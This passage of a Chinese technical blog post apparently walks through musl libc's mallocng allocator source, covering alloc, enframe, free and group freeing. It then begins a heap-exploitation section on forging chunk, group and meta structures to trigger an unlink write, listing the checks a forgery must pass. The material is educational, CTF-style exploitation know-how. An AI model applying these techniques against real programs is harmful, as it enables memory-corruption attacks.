<code>meta</code> 并将它连到 deque 头，最后从其中获取一个下标最小的可用
chunk 更新 <code>avail_mask</code> 并返回下标。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;...&#125;</span><br><span class="line">first = mask &amp; -mask;</span><br><span class="line">m-&gt;avail_mask = mask - first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br></pre></td></tr></table></figure></div>
如果当前的 <code>meta</code> 既没有空闲的 chunk 也没有释放的 chunk
则直接将该 <code>meta</code> 从 deque 中取出。为了充分利用空闲的 chunk
，无论当前 <code>meta</code> 有没有释放的 chunk 都会将 deque
的头指向下一个 <code>meta</code> 。另外如果 deque 为空会返回 0
。如果是正常情况如果有下一个 <code>meta</code> 则下一个
<code>meta</code> 一定会有可用或释放的 chunk 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">    dequeue(pm, m);</span><br><span class="line">    m = *pm;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
如果下一个 <code>meta</code> 全部都是释放的 chunk 那么本着充分利用空闲
chunk 的原则会将 deque 的头指向下一个 <code>meta</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span> &lt;&lt; m-&gt;last_idx) - <span class="number">1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">    mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果当前 chunk 的 <code>active_idx</code>
范围内没有释放的 chunk 则尽可能选择下一个 chunk 否则根据经验扩大
<code>active_idx</code> 的范围，最后调用 <code>activate_group</code>
函数将 <code>active_idx</code> 范围内释放的 chunk 转换为空闲的 chunk。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">    <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">    <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">    <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">    <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span> &lt;&lt; m-&gt;mem-&gt;active_idx) - <span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> size = size_classes[m-&gt;sizeclass] * UNIT;</span><br><span class="line">            <span class="type">int</span> span = UNIT + size * cnt;</span><br><span class="line">            <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">            <span class="keyword">while</span> ((span ^ (span + size - <span class="number">1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                span += size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx + <span class="number">1</span>)</span><br><span class="line">                cnt = m-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">            m-&gt;mem-&gt;active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mask = activate_group(m);</span><br><span class="line">    assert(mask);</span><br><span class="line">    decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### enframe 首先计算出 chunk 的起始和结束地址。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">size_t</span> slack = (stride - IB - n) / UNIT;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p + stride - IB;</span><br></pre></td></tr></table></figure></div> 其中 <code>get_stride</code> 函数是计算出
<code>meta</code> 中 chunk 的大小。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
为了增大利用难度，用户使用的内存区域会在原有 chunk
的位置后加一个随机的偏移 <code>off</code> ，这个随机值是通过
<code>ctr</code>（<code>ctx.mmap_counter</code>）， chunk 的 offset
以及剩余区域大小计算出来的。之后在原有 chunk 的 idx 字段打上
<code>7 &lt;&lt; 5</code> 标记，并且将 <code>p</code> 指针后移
<code>UNIT * off</code> 字节。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">    <span class="type">size_t</span> m = slack;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    off &amp;= m;</span><br><span class="line">    <span class="keyword">if</span> (off &gt; slack) off -= slack + <span class="number">1</span>;</span><br><span class="line">    assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line">    <span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">    <span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = off;</span><br><span class="line">    p[<span class="number">-3</span>] = <span class="number">7</span> &lt;&lt; <span class="number">5</span>;</span><br><span class="line">    p += UNIT * off;</span><br><span class="line">    <span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">    <span class="comment">// byte, so make one.</span></span><br><span class="line">    p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
最后如下图所示设置相关字段信息。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f685c9b70ab21e3f5373428a76c0b481.png"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_size</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">char</span> *end, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> reserved = end - p - n;</span><br><span class="line">    <span class="keyword">if</span> (reserved) end[-reserved] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span> *) (end - <span class="number">4</span>) = reserved;</span><br><span class="line">        end[<span class="number">-5</span>] = <span class="number">0</span>;</span><br><span class="line">        reserved = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) + (reserved &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = (<span class="type">size_t</span>) (p - g-&gt;mem-&gt;storage) / UNIT;</span><br><span class="line">    p[<span class="number">-3</span>] = idx;</span><br><span class="line">    set_size(p, end, n);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div> ### free <code>p</code>
为空直接返回，否则获取 <code>chunk</code> 对应的 <code>meta</code>
，<code>index</code> 和 <code>group</code> 中 <code>chunk</code>
的大小，根据这些信息计算出 <code>chunk</code> 的起始和结束位置。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; idx, all = (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div> 将 <code>chunk</code> 的 <code>index</code> 和
<code>flag</code> 一并置为 0xFF ，<code>offset</code> 置为 0 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *) p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *) ((<span class="type">char</span> *) p - <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>如果释放的 <code>chunk</code> 的起始和结束地址差至少 2
个内存页则释放的 <code>chunk</code> 必然包含一个内存页，因此将
<code>chunk</code> 包含的所有完整物理页调用 <code>madvise</code> 设置
<code>lazyfree</code> 标志，这样在内存紧缺的时候会回收这些物理页。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>) (start - <span class="number">1</span>) ^ (<span class="type">uintptr_t</span>) end) &gt;= <span class="number">2</span> * PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>) start &amp; (PGSZ - <span class="number">1</span>));</span><br><span class="line">    <span class="type">size_t</span> len = (end - base) &amp; -PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (len) &#123;</span><br><span class="line">        <span class="type">int</span> e = errno;</span><br><span class="line">        madvise(base, len, MADV_FREE);</span><br><span class="line">        errno = e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果加上将要释放的 <code>chunk</code> 该
<code>group</code> 中的所有 <code>chunk</code>
要么被释放要么空闲则跳出循环，否则更新 <code>freed_mask</code> 并返回。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (!MT)</span><br><span class="line">        g-&gt;freed_mask = freed + self;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed + self) != freed)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果跳出循环则会调用 <code>nontrivial_free</code> 释放
<code>group</code> 并返回需要 <code>munmap</code>
的内存的起始地址和大小，之后调用 <code>munmap</code> 释放这块内存。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">    <span class="type">int</span> e = errno;</span><br><span class="line">    munmap(mi.base, mi.len);</span><br><span class="line">    errno = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### nontrivial_free 如果加上将要释放的 <code>chunk</code>
该 <code>group</code> 中的所有 <code>chunk</code> 要么被释放要么空闲并且
<code>group</code> 是可以释放的则首先判断 <code>meta</code> 是否在
active 这个 deque 中，如果在的话会将该 <code>meta</code> 从 deque
中取出。如果取出这个操作改变了 <code>active</code> 指针则将
<code>active</code> 当前指向的 <code>meta</code> 对应的
<code>group</code> 中的 <code>chunk</code> 调用
<code>activate_group</code> 函数激活。之后调用 <code>free_group</code>
将 <code>chunk</code> 所在的 <code>group</code> 释放并返回需要
<code>munmap</code> 的内存。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div> 如果该 <code>chunk</code>
所在的 <code>meta</code> 既没有释放的 <code>chunk</code> 也没有空闲的
<code>chunk</code> 则将该 <code>meta</code> 加入到 <code>active</code>
中。最后更新 <code>freed_mask</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">    assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">    <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">    <span class="comment">// after last available slot was taken.</span></span><br><span class="line">    <span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">        <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure></div> ### free_group
首先更新 <code>usage_by_class</code> 。如果 <code>group</code> 是 mmap
得到的则返回 <code>group</code> 对应内存，否则调用
<code>nontrivial_free</code> 释放 <code>group</code> 所在的
<code>chunk</code> 。之后将 <code>meta</code> 释放。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>group</code> 可以被释放的条件如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">okay_to_free</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line">    <span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT * size_classes[sc])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line">    <span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line">    <span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line">    <span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line">    <span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> cnt = g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line">    <span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> * cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="堆利用">堆利用</h2>
<h3 id="unlink">unlink</h3>
<p>伪造 <code>chunk</code> ，<code>group</code> 和 <code>meta</code>
然后释放伪造的 <code>chunk</code> ，通过合理构造伪造的 <code>meta</code>
中的 <code>prev</code> 和 <code>next</code> 利用
<code>nontrivial_free</code> 中调用的 <code>dequeue</code> 实现
<code>unlink</code> 操作。</p>
<p>根据前面的分析， <code>free</code> 首先会调用 <code>get_meta</code>
，而 <code>get_meta</code> 有如下检查： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>) p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *) (p - <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *) (p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) (p - UNIT * offset - UNIT);</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">    assert(meta-&gt;mem == base);</span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *) ((<span class="type">uintptr_t</span>) meta &amp; <span class="number">-4096</span>);</span><br><span class="line">    assert(area-&gt;check == ctx.secret);</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass] * index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass] * (index + <span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen * <span class="number">4096UL</span> / UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *) meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> -
<code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code>
应该关于 0x10 对齐。 - <code>meta-&gt;mem == base</code> ，即
<code>meta</code> 中保存的 <code>group</code> 指针要正确。 -
<code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code>
的索引不能越界。 -
<code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code>
，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code>
，检测 double free 。 - <code>area-&gt;check == ctx.secret</code> ，即
<code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的
<code>meta</code> 位于一个伪造的 <code>meta_area</code>
中，需要首先获取校验值 <code>secret</code> 并保存到
<code>meta_area</code> 开头，即这一页最开始的地方。 -
<code>offset &gt;= size_classes[meta-&gt;sizeclass]*index</code>
，<code>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)</code>
，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应。 -
<code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code>
，即检查 <code>offset</code> 是否越界。</p>
<p>紧接着还会调用 <code>get_nominal_size</code>，其中有对
<code>chunk</code> 的检查，总结来说 chunk 区域尽量都填 0 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后在 <code>free</code> 中的循环满足条件跳出循环调用
<code>nontrivial_free</code> 函数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure></div> 进入
<code>nontrivial_free</code>
函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 0 的前提是
<strong><code>meta-&gt;freeable</code> 非 0</strong>，另外还要确保
<strong><code>meta-&gt;sizeclass</code> &lt; 48</strong> 。之后调用
<code>dequeue</code> 函数触发 unlink 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; 